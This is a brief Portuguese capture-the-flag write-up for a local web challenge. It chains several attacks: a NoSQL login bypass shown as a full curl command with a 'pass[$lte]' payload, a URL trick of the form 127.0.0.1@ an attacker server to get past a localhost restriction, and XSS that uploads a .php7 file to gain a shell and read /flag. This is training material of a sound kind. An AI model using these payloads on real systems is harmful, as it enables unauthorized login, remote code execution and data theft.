Writeup:

	1. Bypass do login com o operador $lte, os outros operadores estão bloqueados, então vai exigir do atacante pesquisa e atenção dos operadores restantes.
		1. Note que ao usar $lte, o atacante também deve estar atento que nas tentativas com 'a' e 'b' irá falhar, pois a senha começa com 'b'
		2.  curl -L -v -X POST --data "user=admin&pass[\$lte]=c" http://localhost/roadsec-web-1/web/login.php

	2. Entrar na tela de report.php e inserir uma url que dê bypass na restrição de http://127.0.0.1
		1. Bypass: http://127.0.0.1@<SERVIDOR_ATACANTE>
		2. Inserir uma URL com XSS fazendo POST de arquivo PHP com extensão .php7 no upload.php

	3. Com o upload o atacante terá shell na máquina
		1. Ler a flag em /flag
